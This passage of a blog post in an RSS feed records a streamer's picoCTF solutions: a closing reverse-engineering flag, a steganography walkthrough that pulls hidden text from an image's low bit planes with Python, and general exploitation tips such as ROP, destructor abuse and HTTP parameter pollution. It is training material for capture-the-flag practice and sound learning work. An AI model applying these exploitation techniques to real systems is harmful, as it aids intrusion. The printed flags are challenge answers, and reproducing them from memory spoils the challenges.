  local_60 <span style="color:#f92672">=</span> local_60 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
}
</code></pre></div><p>So we know that <code>1_37d24ffd}</code> is from 15 to the end of the flag. When we combine it we get this:</p>
<pre><code>picoCTF{An0tha_1_37d24ffd}
</code></pre><p>And there&rsquo;s the flag.</p>
<h2 id="pastaaaa---forensics">pastaAAA - Forensics</h2>
<p>We get a PNG of some pasta. Gynvael notices that there is some weird banding (gradients that are not smooth color transitions) on the right side of the image, which means there&rsquo;s something weird that happened.</p>
<p>Looking in a hexeditor shows that there are normal headers and the end is normal.</p>
<p>A good technique Gynvael recommends is to run a reverse image search on the image for CTFs to see if you can find the original image. The first search image doesn&rsquo;t work too well (image.google.com). But [https://tineye.com] is a search engine that looks for images that look identical to the one that you give. He finds that the image is just a stock image and so it doesn&rsquo;t look like the reverse image search won&rsquo;t do any good for this challenge.</p>
<p>When inspecting the image a second time, Gynvael notices a &lsquo;p&rsquo; towards the left of the image. The challenge is more of a steganography challenge rather than a file format challenge.</p>
<p>Open up the image in GIMP and do some &ldquo;Image magic.&rdquo;</p>
<p>Colors -&gt; Curves. Notice that the image is highly segmented. We see some letters, but we can&rsquo;t seem to get the full flag.</p>
<p>Use GIMP to save the png as a .raw (planar).</p>
<p>Use python to try separating the bit planes:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">d <span style="color:#f92672">=</span> bytearray(open(<span style="color:#e6db74">&#34;ctf.raw&#34;</span>, <span style="color:#e6db74">&#34;rb&#34;</span>)<span style="color:#f92672">.</span>read())

a <span style="color:#f92672">=</span> []

<span style="color:#75715e"># Make 8 copies in a bytearray</span>
<span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>):
  a<span style="color:#f92672">.</span>append(bytearray(len(d)))


<span style="color:#66d9ef">for</span> i, byte <span style="color:#f92672">in</span> enumerate(d):
  <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>):
    bit <span style="color:#f92672">=</span> ((byte <span style="color:#f92672">&gt;&gt;</span> j) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span>) <span style="color:#75715e"># Extract a bit</span>
    a[j][i] <span style="color:#f92672">=</span> bit <span style="color:#f92672">*</span> <span style="color:#ae81ff">255</span>

<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>):
  <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;plane</span><span style="color:#e6db74">%i</span><span style="color:#e6db74">.raw&#34;</span> <span style="color:#f92672">%</span> i, <span style="color:#e6db74">&#34;wb&#34;</span>) <span style="color:#66d9ef">as</span> f:
    f<span style="color:#f92672">.</span>write(a[i])
</code></pre></div><pre><code class="language-console" data-lang="console">$ python3 go.py
$ ls
ctf.png  ctf.raw  go.py  plane0.raw  plane1.raw  plane2.raw  plane3.raw  plane4.raw  plane5.raw  plane6.raw  plane7.raw
</code></pre><p>Open the raw image as planar 24 bpp (3 bytes per pixel) as a 826x620 image. The bottom 3 planes seem to contain the flag. Change the script to only get the bottom 3 planes and combine them:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">d <span style="color:#f92672">=</span> bytearray(open(<span style="color:#e6db74">&#34;ctf.raw&#34;</span>, <span style="color:#e6db74">&#34;rb&#34;</span>)<span style="color:#f92672">.</span>read())

a <span style="color:#f92672">=</span> []

<span style="color:#75715e"># Make 8 copies in a bytearray</span>
<span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>):
  a<span style="color:#f92672">.</span>append(bytearray(len(d)))


<span style="color:#66d9ef">for</span> i, byte <span style="color:#f92672">in</span> enumerate(d):
  <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">3</span>):
    bit <span style="color:#f92672">=</span> ((byte <span style="color:#f92672">&gt;&gt;</span> j) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span>) <span style="color:#75715e"># Extract a bit</span>
    a[<span style="color:#ae81ff">0</span>][i] <span style="color:#f92672">|=</span> bit <span style="color:#f92672">&lt;&lt;</span> (j <span style="color:#f92672">+</span> <span style="color:#ae81ff">5</span>)

<span style="color:#75715e"># for i in range(8):</span>
<span style="color:#75715e">#   with open(&#34;plane%i.raw&#34; % i, &#34;wb&#34;) as f:</span>
<span style="color:#75715e">#     f.write(a[i])</span>
<span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;output.raw&#34;</span>, <span style="color:#e6db74">&#34;wb&#34;</span>) <span style="color:#66d9ef">as</span> f:
  f<span style="color:#f92672">.</span>write(a[<span style="color:#ae81ff">0</span>])
</code></pre></div><p>Open the output.raw file (Gynvael seems to use <a href="https://www.irfanview.com">IrfanView</a>).</p>
<p>In this steganography challenge, data was hidden in the least 3 significant bits. The banding we saw earlier was because the detail was lost with the removal of these 3 bottom bits per pixel.</p>
<h2 id="random-other-stuff-gynvael-says-about-solving-ctf-challenges-during-the-stream">Random other stuff Gynvael says about solving ctf challenges during the stream</h2>
<ul>
<li>He recommends kaitai struct for stegno challenges (Part 1: 46:39)</li>
<li>Recommends pdfstreamdumper</li>
<li>Thumbnails can store info</li>
<li>For network dumps there are two main tools: Wireshark and NetworkMiner</li>
<li>Gynvael recommends working on ctf challenges remotely in most cases since in many cases an exploit could work locally but not remotely (like in the above case).</li>
<li>On 64-bit binary exploitation challenges, when passing parameters to functions, ROP is usually the way to get the proper values into registers.</li>
<li>calling exit() still means the destructors are still called. An attacker can use the destructor call to their advantage. Use _exit instead with the underscore.</li>
<li>In part 5, Gynvael mentions a security bug called Http parameter pollution. While looking at JSON data, Gynvael points out how when there are keys with the same name, then there could be a security bug since some parsers might just return the first key-value pair while another parser might return the second key-value pair.</li>
<li>According to Gynvael there are only certain operations used for standard reverse engineering challenges:
<ol>
<li>add sub</li>
<li>rol ror (rotate bits (not same as shift))</li>
<li>xor</li>
</ol>
</li>
<li><code>FILE *f = fopen(&quot;flag.txt&quot;,&quot;r&quot;);</code> can make a the flag appear in a buffer in libc. There&rsquo;s a buffer for a given file in libc.</li>
</ul>
<h2 id="todo">TODO</h2>
<ul>
<li>Fix all the weird non ascii apostrophes and double quotes</li>
</ul>
]]></content>
        </item>
        
    </channel>
</rss>
